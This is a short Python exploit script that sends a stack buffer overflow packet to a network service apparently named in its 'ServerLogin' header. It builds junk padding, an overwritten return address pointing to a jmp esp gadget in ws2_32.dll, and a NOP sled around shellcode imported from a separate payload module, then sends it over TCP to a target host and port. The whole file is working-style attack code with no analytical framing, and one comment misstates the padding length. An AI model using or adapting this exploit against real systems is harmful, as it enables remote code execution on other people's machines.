#!/usr/bin/python

import socket
from payload import buf

import struct
def shell_attack(target_machine, target_port):
    host = target_machine
    port = target_port			#default server port, unchangeable (I think)
        
    # Begin payload buffer:

    packet_header = b"\x53\x65\x72\x76\x65\x72\x4C\x6F\x67\x69\x6E\x02"

    junk = b"\x90" * 256; 			#265 byte junk buffer to reach eip
    eip = b"\xFB\xF8\xAB\x71";		#jmp esp (via ws2_32.dll) 
    nops = b"\x90" * 12;				#small nop sled

    packet = packet_header + junk + eip + nops + buf + nops + nops

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
   
    s.send(packet + b"\r\n")

    s.close()